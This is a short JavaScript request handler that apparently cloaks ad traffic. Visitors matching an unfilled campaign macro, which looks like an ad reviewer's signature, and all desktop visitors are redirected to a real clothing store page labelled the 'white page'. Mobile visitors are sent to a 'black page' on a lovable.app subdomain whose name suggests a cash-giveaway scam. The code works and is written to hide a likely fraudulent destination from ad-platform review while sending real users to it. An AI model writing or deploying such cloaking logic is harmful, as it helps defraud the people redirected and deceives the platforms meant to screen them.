export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.centrepointstores.com/ae/en/c/men-clothing-tshirtsandpolos-tshirts?__cf_chl_rt_tk=vT2R8B_ae_5sv5uCVxEDdi1xlBwmaPpm.31Qc7Tr1YA-1763917034-1.0.1.1-SOdHJMdtEX0zjO0j4oxdcDn6Y0l7RDbxlhv8W5HiXcQ";
    const blackPageURL = "https://lovefrecashhhh.lovable.app/?";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }























